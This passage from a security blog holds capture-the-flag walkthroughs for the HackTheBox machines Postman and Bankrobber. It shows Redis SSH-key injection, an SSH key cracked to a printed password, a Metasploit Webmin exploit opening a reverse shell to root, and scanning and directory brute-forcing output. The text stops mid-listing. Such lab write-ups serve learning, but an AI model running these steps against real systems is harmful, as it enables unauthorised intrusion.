broker.</p><p>I used the <a href="https://packages.debian.org/stretch/redis-tools" target="_blank" rel="noopener">redis-tools package</a> to communicate to the service of Redis. The existing vulnerability in version 4.0.9, you can interact redis without username and password.</p><p>So, to start let’s check if I can access the instance, which is a prerequisite:</p><h3 id="Communicate-with-telnet"><a href="#Communicate-with-telnet" class="headerlink" title="Communicate with telnet"></a>Communicate with telnet</h3><p><img src="/img/postman/postman-telnet.png" alt="HackTheBox-Postman/postman-telnet.png" title="Redis Telnet"></p><p>Works, <code>Redis</code> it is unprotected without a password set up.</p><p>Next is to try the <code>redis-cli</code> to look if i’ll got something.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/postman </span><br><span class="line">❯ redis-cli -h 10.10.10.160</span><br><span class="line">10.10.10.160:6379&gt; get s-key</span><br><span class="line"><span class="string">"\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0+WZO2fM8J6HgUa5kgmE4xQwjMbiWFUYOND+7Qpm6a4XmJM6NABlIOUTe5FnUx+KZmcHlAenOqVdDPsa9rE1G9vZVi8OSFNJ6xplYzyFD9pzyFJ+e2Zz6c6RD2uptE9meJAiE+RQFpNM5TqZgpmlYGG1fi/2Pgtud7I0Lj95S/lRWqtvVN6uK44lKWru+YYwGtA+3unG+0lgRJrC+58+VFV/Cm54ZvJUd/I/4Q08ij6qx4AD1Y0xQqWKoDZMvb0kluzIRcvaYrTEKaFhxVpliVlqP6U3HFgeVZ2AJB redis@server\n\n\n\n"</span></span><br><span class="line">10.10.10.160:6379&gt;</span><br></pre></td></tr></table></figure><p>By using <code>get s-key</code> command inside <code>redis</code> it shows that there’s an existing ssh key that use for authentication. As a redis user shell I can write something in the database to a file with <code>SAVE</code> command. So I was thinking if I can put mine to get in.</p><h3 id="Inject-SSH-Keys"><a href="#Inject-SSH-Keys" class="headerlink" title="Inject SSH Keys"></a>Inject SSH Keys</h3><p>Since the <code>Redis</code> is not protected. I will try to write something into ~/.ssh/authorized_keys in order to gain access to shell. So i will generate my <code>SSH Key</code> first and save into my postman directory.</p><p><code>OPENSSH Key</code> will not valid. To get this work I’ll need <code>RSA PRIVATE Key</code> using this line I can push my ssh-key into private key.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">ssh-keygen -m PEM -t rsa -b 4096 -C bunny@lanaya</span><br></pre></td></tr></table></figure><p><strong>Generated SSH Key</strong></p><p><img src="/img/postman/postman-rsa-keys.png" alt="HackTheBox-Postman/postman-rsa-keys.png" title="Payas0 RSA Private Key"></p><p>Now I’ve a key. My goal is to put it into the Redis server memory, and later to transfer it into a file, in a way that the resulting authorized_keys file is still a valid one.</p><p>So’ by following this <a href="https://ebook.konfigurasi.net/Security/Kali_Linux_An_Ethical_Hacker' target="_blank" rel="noopener"s_Cookbook.pdf">method</a> I will now put my generated ssh-key.</p><p><img src="/img/postman/postman-flushall.png" alt="HackTheBox-Postman/postman-flushall.png" title="Inject SSH Keys"></p><p>Now Let’s now put my SSH Key into the <code>Redis</code>.<br>Using <code>redis-cli</code> I can check, set a directory for redis and save.</p><p><img src="/img/postman/postman-config.png" alt="HackTheBox-Postman/postman-config.png" title="Inject SSH Keys"></p><p>I’ve successfully save my SSH key. Now I’ll try to login with ssh.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/postman </span><br><span class="line">❯ ssh -v -i id_rsa redis@10.10.10.160</span><br><span class="line">OpenSSH_8.1p1 Debian-1, OpenSSL 1.1.1d  10 Sep 2019</span><br><span class="line">debug1: Reading configuration data /etc/ssh/ssh_config</span><br><span class="line">debug1: /etc/ssh/ssh_config line 19: Applying options <span class="keyword">for</span> *</span><br><span class="line">debug1: Connecting to 10.10.10.160 [10.10.10.160] port 22.</span><br><span class="line">debug1: Connection established.</span><br><span class="line">debug1: identity file id_rsa <span class="built_in">type</span> 0</span><br><span class="line">debug1: identity file id_rsa-cert <span class="built_in">type</span> -1</span><br><span class="line">debug1: Local version string SSH-2.0-OpenSSH_8.1p1 Debian-1</span><br><span class="line">debug1: Remote protocol version 2.0, remote software version OpenSSH_7.6p1 Ubuntu-4ubuntu0.3</span><br><span class="line">debug1: match: OpenSSH_7.6p1 Ubuntu-4ubuntu0.3 pat OpenSSH_7.0*,OpenSSH_7.1*,OpenSSH_7.2*,OpenSSH_7.3*,OpenSSH_7.4*,OpenSSH_7.5*,OpenSSH_7.6*,OpenSSH_7.7* compat 0x04000002</span><br><span class="line">debug1: Authenticating to 10.10.10.160:22 as <span class="string">'redis'</span></span><br><span class="line">debug1: SSH2_MSG_KEXINIT sent</span><br><span class="line">debug1: SSH2_MSG_KEXINIT received</span><br><span class="line">debug1: kex: algorithm: curve25519-sha256</span><br><span class="line">debug1: kex: host key algorithm: ecdsa-sha2-nistp256</span><br><span class="line">debug1: kex: server-&gt;client cipher: chacha20-poly1305@openssh.com MAC: &lt;implicit&gt; compression: none</span><br><span class="line">debug1: kex: client-&gt;server cipher: chacha20-poly1305@openssh.com MAC: &lt;implicit&gt; compression: none</span><br><span class="line">debug1: expecting SSH2_MSG_KEX_ECDH_REPLY</span><br><span class="line">debug1: Server host key: ecdsa-sha2-nistp256 SHA256:kea9iwskZTAT66U8yNRQiTa6t35LX8p0jOpTfvgeCh0</span><br><span class="line">debug1: Host <span class="string">'10.10.10.160'</span> is known and matches the ECDSA host key.</span><br><span class="line">debug1: Found key <span class="keyword">in</span> /root/.ssh/known_hosts:3</span><br><span class="line">debug1: rekey out after 134217728 blocks</span><br><span class="line">debug1: SSH2_MSG_NEWKEYS sent</span><br><span class="line">debug1: expecting SSH2_MSG_NEWKEYS</span><br><span class="line">debug1: SSH2_MSG_NEWKEYS received</span><br><span class="line">debug1: rekey <span class="keyword">in</span> after 134217728 blocks</span><br><span class="line">debug1: Will attempt key: id_rsa RSA SHA256:RHbmsaWNCcKp3yQZ5DzJzY7qtBWYIMl5z5h3BT1dbP8 explicit</span><br><span class="line">debug1: SSH2_MSG_EXT_INFO received</span><br><span class="line">debug1: kex_input_ext_info: server-sig-algs=&lt;ssh-ed25519,ssh-rsa,rsa-sha2-256,rsa-sha2-512,ssh-dss,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521&gt;</span><br><span class="line">debug1: SSH2_MSG_SERVICE_ACCEPT received</span><br><span class="line">debug1: Authentications that can <span class="built_in">continue</span>: publickey,password</span><br><span class="line">debug1: Next authentication method: publickey</span><br><span class="line">debug1: Offering public key: id_rsa RSA SHA256:RHbmsaWNCcKp3yQZ5DzJzY7qtBWYIMl5z5h3BT1dbP8 explicit</span><br><span class="line">debug1: Server accepts key: id_rsa RSA SHA256:RHbmsaWNCcKp3yQZ5DzJzY7qtBWYIMl5z5h3BT1dbP8 explicit</span><br><span class="line">debug1: Authentication succeeded (publickey).</span><br><span class="line">Authenticated to 10.10.10.160 ([10.10.10.160]:22).</span><br><span class="line">debug1: channel 0: new [client-session]</span><br><span class="line">debug1: Requesting no-more-sessions@openssh.com</span><br><span class="line">debug1: Entering interactive session.</span><br><span class="line">debug1: pledge: network</span><br><span class="line">debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0</span><br><span class="line">debug1: Sending environment.</span><br><span class="line">debug1: Sending env LANG = en_US.utf8</span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available <span class="keyword">for</span> installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https://ubuntu.com/livepatch</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line">Last login: Sun Mar 15 00:54:05 2020 from 10.10.15.124</span><br><span class="line">redis@Postman:~$ whoami</span><br><span class="line">redis</span><br></pre></td></tr></table></figure><p>It works! I’ve got now the initial shell.</p><hr><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>By doing some <code>Recon</code> i’ll use <a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh" target="_blank" rel="noopener">LinEnum.sh</a> – Scripted Local Linux Enumeration &amp; Privilege Escalation Checks.<br>It will help to find weaknesses and save my time to do the Privilege Escalation,  I’ll uploaded it into <code>/tmp/</code> directories of redis and execute it, so:</p><p><img src="/img/postman/postman-linenum.png" alt="HackTheBox-Postman/postman-linenum.png" title="Recon LinEnum"></p><p>At first it will show the system information of Postman machine.</p><h3 id="Shell-user"><a href="#Shell-user" class="headerlink" title="Shell user"></a>Shell user</h3><p>I see the user <code>Matt</code> and also my shell user as Redis.</p><p><img src="/img/postman/postman-users.png" alt="HackTheBox-Postman/postman-users.png" title="Recon LinEnum"></p><h3 id="Backup-private-SSH-Key"><a href="#Backup-private-SSH-Key" class="headerlink" title="Backup private SSH Key"></a>Backup private SSH Key</h3><p>Going deep of recon, there’s a file that caught my attention. Is a backup SSH key of some user. Base on the info that show’ it is owned by user <code>Matt</code></p><p><img src="/img/postman/postman-private-keys.png" alt="HackTheBox-Postman/postman-private-keys.png" title="Recon LinEnum"></p><p>Going to the <code>/opt/</code> directory, I’ll try to transfer <code>id_rsa.bak</code> into my machine but it seems not working, so I used <code>cat</code> to view the content of the file.</p><p><img src="/img/postman/postman-cat-keys.png" alt="HackTheBox-Postman/postman-cat-keys.png" title="Matt SSH Key"></p><h3 id="Cracking-the-HASH"><a href="#Cracking-the-HASH" class="headerlink" title="Cracking the HASH"></a>Cracking the HASH</h3><p>I copy the content of <code>id_rsa.bak</code> into my machine and I use <a href="https://github.com/koboi137/john/blob/bionic/ssh2john.py" target="_blank" rel="noopener">ssh2john</a> to convert and crack it with <a href="https://github.com/magnumripper/JohnTheRipper" target="_blank" rel="noopener">John The Ripper</a></p><p><img src="/img/postman/postman-crack.png" alt="HackTheBox-Postman/postman-crack.png" title="Crack SSH Key"></p><p>Cracking this using <a href="https://github.com/magnumripper/JohnTheRipper" target="_blank" rel="noopener">John The Ripper</a>.</p><p><img src="/img/postman/postman-crack-john.png" alt="HackTheBox-Postman/postman-crack-john.png" title="Crack SSH Key"></p><p>Just only 14 seconds. I’ve got now the password of <code>Matt</code></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">password:   computer2008</span><br></pre></td></tr></table></figure><h3 id="Login-as-Matt"><a href="#Login-as-Matt" class="headerlink" title="Login as Matt"></a>Login as Matt</h3><p>I may now able to login as <code>Matt</code> and get the <code>user.txt</code></p><p><img src="/img/postman/postman-user.png" alt="HackTheBox-Postman/postman-user.png" title="Matt user shell"></p><h3 id="CVE-Webmin-1-910"><a href="#CVE-Webmin-1-910" class="headerlink" title="CVE Webmin 1.910"></a>CVE Webmin 1.910</h3><p>In the early stage of my Penetration Testing to this machine’ there’s an existing vulnerability – <code>CVE Webmin 1.910</code> that need credentials. I’ll use metasploit to do the exploitation and pick the <code>webmin_packageup_rce</code></p><p><img src="/img/postman/postman-msf.png" alt="HackTheBox-Postman/postman-msf.png" title="Webmin 1.910 Exploit"></p><p>I will use the credentails for Matt and let’s see what will happen ;)</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># metasploit</span></span><br><span class="line"></span><br><span class="line">msf5 &gt; exploit(linux/http/webmin_packageup_rce) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/http/webmin_packageup_rce):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   PASSWORD                    yes       Webmin Password</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">'file:&lt;path&gt;'</span></span><br><span class="line">   RPORT      10000            yes       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /                yes       Base path <span class="keyword">for</span> Webmin application</span><br><span class="line">   USERNAME                    yes       Webmin Username</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (cmd/unix/reverse_perl):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Webmin &lt;= 1.910</span><br></pre></td></tr></table></figure><p>base on the options it requires – <code>PASSWORD</code>, <code>RPORT is on default 10000</code>, <code>RHOSTS which is the victim IP (Postman)</code>, <code>SSL (will set to true)</code>, and <code>USERNAME</code> so:</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># metasploit</span></span><br><span class="line"></span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> PASSWORD computer2008</span><br><span class="line">PASSWORD =&gt; computer2008</span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> RHOSTS 10.10.10.160</span><br><span class="line">RHOSTS =&gt; 10.10.10.160</span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> SSL <span class="literal">true</span></span><br><span class="line">SSL =&gt; <span class="literal">true</span></span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> USERNAME Matt</span><br><span class="line">USERNAME =&gt; Matt</span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> LHOST 10.10.10.160</span><br><span class="line">LHOST =&gt; 10.10.10.160</span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.15.124:4444 </span><br><span class="line">[+] Session cookie: 6fda9f4ceb95660a3799aaf46bffea37</span><br><span class="line">[*] Attempting to execute the payload...</span><br><span class="line">[*] Command shell session 1 opened (10.10.15.124:4444 -&gt; 10.10.10.160:47708) at 2020-03-15 09:33:49 +0800</span><br><span class="line"></span><br><span class="line">[*] Trying to find binary(python) on target machine</span><br><span class="line">[*] Found python at /usr/bin/python</span><br><span class="line">[*] Using `python` to pop up an interactive shell</span><br></pre></td></tr></table></figure><p>It works! And to upgrade my shell i use <code>import pty</code> using <code>python</code>:</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">'import pty; pty.spawn("/bin/bash");'</span></span><br></pre></td></tr></table></figure><hr><h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><p>Very straightforward – Rooted! Now i can get the <code>root.txt</code> </p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root@Postman:~<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><p><img src="/img/postman/postman-rooted.png" alt="HackTheBox-Postman/postman-rooted.png" title="Postman - Rooted!"></p><hr><p>If you liked my writeup please leave a respect on my <a href="https://www.hackthebox.eu/profile/128965" target="_blank" rel="noopener">Profile</a></p><p><img src="https://www.hackthebox.eu/badge/image/128965" alt="Payas0" title="Payas0"></p><hr><p>Referrences:<br><a href="https://medium.com/@knownsec404team/rce-exploits-of-redis-based-on-master-slave-replication-ef7a664ce1d0" target="_blank" rel="noopener">Exploit Redis Server Article</a><br><a href="https://book.hacktricks.xyz/pentesting/6379-pentesting-redis" target="_blank" rel="noopener">Pentesting with Redis</a><br><a href="https://www.rapid7.com/db/modules/exploit/linux/http/webmin_packageup_rce" target="_blank" rel="noopener">Official Exploit of Webmin 1.910</a><br><a href="https://ebook.konfigurasi.net/Security/Kali_Linux_An_Ethical_Hacker' target="_blank" rel="noopener"s_Cookbook.pdf">How to get in into the machine with Redis Exploitation</a></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox - PenTesting </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pentest </tag>
            
            <tag> cve </tag>
            
            <tag> linux </tag>
            
            <tag> ssh </tag>
            
            <tag> retired </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Bankrobber</title>
      <link href="/2020-02-20/HackTheBox-Bankrobber/"/>
      <url>/2020-02-20/HackTheBox-Bankrobber/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/bank/bank-detail1.png" alt="HackTheBox-Bankrobber/bank-detail.png" title="Bankrobber machine details"></p><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>   → Insane machine – Bankrobber is a Web Application that vulnerable to <code>XSS</code>, <code>SQL Injection</code> and <code>RCE</code> that I have to exploit to get the Admin credentials by using XSS.<br>   SQL Injection to study how’s the <code>backdoorchecker.php</code> work, do command injection inside the machine from Web Application to get a reverse shell.<br>   Inside the machine’ I did portforwarding to test the E-Coin transfer’ from there I managed to inject RCE and get the root.</p><h2 id="Penetration-Testing-Methodologies"><a href="#Penetration-Testing-Methodologies" class="headerlink" title="Penetration Testing Methodologies"></a>Penetration Testing Methodologies</h2><ol><li><p><strong>Network Scanning</strong></p><p>→ Nmap scan</p><p>→ discover open ports and what services are running</p></li><li><p><strong>Enumeration</strong></p><p>→ Browsing the HTTP Service</p><p>→ MySQL and SMB open</p><p>→ Bruteforce the Web page directories</p></li><li><p><strong>Post - Exploitation</strong></p><p>→ Create account and Login</p><p>→ Transfer any amount of e-coin</p><p>→ Do client side attack</p><p>→ Use XSS to steal admin credentials</p><p>→ Login as admin and find some interesting in the page</p></li><li><p><strong>Exploitation</strong></p><p>→ Found an XSS and SQL Injection vulnerabilites in <code>search.php</code> and <code>backdoorchecker.php</code></p><p>→ Upload a webshell to the server and get a reverse shell</p></li><li><p><strong>Privilege Escalation</strong></p><p>→ Use <a href="https://github.com/carlospolop/winpe" target="_blank" rel="noopener">winPE</a>. or <code>Windows privilege escalation with cmd</code></p><p>→ Looking at running process and active connections inside the machine</p><p>→ Use obfuscated meterpreter and tunnel the network with Portforwarding</p><p>→ Bruteforce the digit code and test the E-coin transfer</p><p>→ Found <code>RCE</code>(Remote Code Execution) in E-coin transfer</p><p>→ Gain the Administrator shell</p></li></ol><hr><h2 id="Network-Scanning"><a href="#Network-Scanning" class="headerlink" title="Network Scanning"></a>Network Scanning</h2><h3 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h3><p>→ First, I run the <strong>Nmap</strong> to scan the target and get information about the various services that are running on the target machine. I use</p><hr><ul><li>-sV ⇒ Probe open ports to determine service/version info</li><li>-sC ⇒ equivalent to —script=default</li><li>-p- ⇒ Scan all 65535 ports</li><li>-oN ⇒ to save our scan results to a text file</li></ul><hr><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sh</span></span><br><span class="line">nmap -sV -sC -p- 10.10.10.154 -oN nmap-Bankrobber</span><br></pre></td></tr></table></figure><h3 id="Nmap-results"><a href="#Nmap-results" class="headerlink" title="Nmap results"></a>Nmap results</h3><p>Which found opened ports 80, 443, 445 and 3306</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sh</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber </span><br><span class="line">❯ nmap -sV -sC -p- nmap-bankrobber -oN 10.10.10.154</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-08 03:12 PST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.154</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line">Not shown: 996 filtered ports</span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">80/tcp   open  tcpwrapped</span><br><span class="line">|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4</span><br><span class="line">|_http-title: E-coin</span><br><span class="line">443/tcp  open  tcpwrapped</span><br><span class="line">|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4</span><br><span class="line">|_http-title: Bad request!</span><br><span class="line">| ssl-cert: Subject: commonName=localhost</span><br><span class="line">| Not valid before: 2009-11-10T23:48:47</span><br><span class="line">|_Not valid after:  2019-11-08T23:48:47</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">445/tcp  open  tcpwrapped</span><br><span class="line">3306/tcp open  tcpwrapped</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose|phone</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2008|10|Phone (90%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2008 R2 (90%), Microsoft Windows 10 1511 - 1607 (85%), Microsoft Windows 8.1 Update 1 (85%), Microsoft Windows Phone 7.5 or 8.0 (85%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 1h02m13s, deviation: 0s, median: 1h02m13s</span><br><span class="line">|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-03-07T20:15:16</span><br><span class="line">|_  start_date: 2020-03-07T10:51:24</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 78.81 seconds</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber took 1m19s </span><br><span class="line">❯</span><br></pre></td></tr></table></figure><hr><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>I visited the web page in port 80 and it’s present a Bitcoin web page with Login and Register form.</p><p><img src="/img/bank/web-page.gif" alt="HackTheBox-Bankrobber/web-page.gif" title="Bankrobber Web Page"></p><h3 id="MySQL-on-port-3306"><a href="#MySQL-on-port-3306" class="headerlink" title="MySQL on port 3306"></a>MySQL on port 3306</h3><p>The MySQL port is open so I try to connect with it but it couldn’t</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sh</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber </span><br><span class="line">❯ mysql -h 10.10.10.154 --port 3306</span><br><span class="line">ERROR 1130 (HY000): Host <span class="string">'10.10.15.71'</span> is not allowed to connect to this MariaDB server</span><br></pre></td></tr></table></figure><h3 id="SMB-on-port-445"><a href="#SMB-on-port-445" class="headerlink" title="SMB on port 445"></a>SMB on port 445</h3><p>connecting to SMB is not helpful too.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sh</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber took 2s </span><br><span class="line">❯ smbmap -H 10.10.10.154 -u bank</span><br><span class="line">[+] Finding open SMB ports....</span><br><span class="line">[!] Authentication error on 10.10.10.154</span><br><span class="line">[!] Authentication error on 10.10.10.154</span><br></pre></td></tr></table></figure><h3 id="Brutefore-Web-directories"><a href="#Brutefore-Web-directories" class="headerlink" title="Brutefore Web directories"></a>Brutefore Web directories</h3><p>I also run <a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a> <code>Web path scanner</code> to look if there’s any interesting web directories.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> dirsearch on  master via 🐍 v2.7.17 </span><br><span class="line">❯ ./dirsearch.py -u <span class="string">"http://10.10.10.154"</span> -e asd -t 50</span><br><span class="line"></span><br><span class="line"> _|. _ _  _  _  _ _|_    v0.3.9</span><br><span class="line">(_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: asd | HTTP method: get | Threads: 50 | Wordlist size: 6109</span><br><span class="line"></span><br><span class="line">Error Log: /opt/dirsearch/logs/errors-20-03-06_18-13-45.log</span><br><span class="line"></span><br><span class="line">Target: http://10.10.10.154</span><br><span class="line"></span><br><span class="line">[18:13:46] Starting: </span><br><span class="line">[18:13:47] 403 -    1KB - /%3f/        </span><br><span class="line">[18:13:47] 403 -    1KB - /%20../</span><br><span class="line">[18:13:47] 403 -    1KB - /%ff/             </span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccessOLD                             </span><br><span class="line">[18:13:49] 403 -    1KB - /.ht_wsr.txt     </span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess-marco</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess-local</span><br><span class="line">[18:13:49] 403 -    1KB - /.hta</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess-dev</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess.sample</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess.BAK</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess_orig</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess.bak1</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess.txt</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess_sc</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess.old</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess_extra</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess.orig</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess.save</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccessOLD2</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess~</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccessBAK</span><br><span class="line">[18:13:49] 403 -    1KB - /.htgroup</span><br><span class="line">[18:13:49] 403 -    1KB - /.htpasswd-old</span><br><span class="line">[18:13:49] 403 -    1KB - /.htpasswd_test</span><br><span class="line">[18:13:49] 403 -    1KB - /.htpasswds</span><br><span class="line">[18:13:49] 403 -    1KB - /.htusers</span><br><span class="line">[18:13:54] 301 -  336B  - /Admin  -&gt;  http://10.10.10.154/Admin/                 </span><br><span class="line">[18:13:54] 301 -  336B  - /admin  -&gt;  http://10.10.10.154/admin/</span><br><span class="line">[18:13:54] 200 -   40B  - /admin%20/          </span><br><span class="line">[18:13:54] 301 -  336B  - /ADMIN  -&gt;  http://10.10.10.154/ADMIN/</span><br><span class="line">[18:13:54] 301 -  337B  - /admin.  -&gt;  http://10.10.10.154/admin./</span><br><span class="line">[18:13:55] 403 -    1KB - /admin/.htaccess   </span><br><span class="line">[18:13:55] 200 -   40B  - /admin/?/login</span><br><span class="line">[18:13:55] 200 -   40B  - /admin/                </span><br><span class="line">[18:13:55] 200 -   40B  - /admin/index.php                                                                  </span><br><span class="line">[18:14:05] 403 -    1KB - /cgi-bin/                                                                               </span><br><span class="line">[18:14:10] 301 -  334B  - /css  -&gt;  http://10.10.10.154/css/                   </span><br><span class="line">[18:14:15] 403 -    1KB - /error/                                         </span><br><span class="line">[18:14:17] 503 -    1KB - /examples/servlets/index.html                                               </span><br><span class="line">[18:14:17] 503 -    1KB - /examples/servlets/servlet/RequestHeaderExample</span><br><span class="line">[18:14:17] 503 -    1KB - /examples/servlets/servlet/CookieExample</span><br><span class="line">[18:14:17] 503 -    1KB - /examples </span><br><span class="line">[18:14:17] 503 -    1KB - /examples/</span><br><span class="line">[18:14:17] 301 -  336B  - /fonts  -&gt;  http://10.10.10.154/fonts/</span><br><span class="line">[18:14:21] 301 -  334B  - /img  -&gt;  http://10.10.10.154/img/                        </span><br><span class="line">[18:14:22] 200 -    8KB - /index.PHP                                                         </span><br><span class="line">[18:14:22] 200 -    8KB - /INDEX.PHP                                                                           </span><br><span class="line">[18:14:22] 200 -    8KB - /index.php</span><br><span class="line">[18:14:22] 200 -    8KB - /index.php/login/</span><br><span class="line">[18:14:24] 301 -  333B  - /js  -&gt;  http://10.10.10.154/js/                                              </span><br><span class="line">[18:14:26] 302 -    0B  - /login.php  